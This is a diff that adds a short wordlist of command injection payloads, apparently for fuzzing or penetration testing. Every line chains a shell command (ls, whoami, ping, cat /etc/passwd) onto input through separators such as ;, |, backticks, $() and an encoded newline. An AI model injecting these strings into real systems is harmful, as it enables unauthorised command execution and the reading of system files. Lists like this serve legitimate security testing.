@@ -1,0 +1,16 @@
+# Command injection payloads
+; ls -la
+%0a ls -la
+`ls`
+'ls'
+| whoami
+`cat /etc/passwd`
+'cat /etc/passwd'
+$(cat /etc/passwd)
+& ping -c 4 127.0.0.1
+%0a ping -c 4 127.0.0.1
+; cat /etc/passwd
+| ls
+| cat /etc/passwd
+$(ls)
+$(cat /etc/passwd)
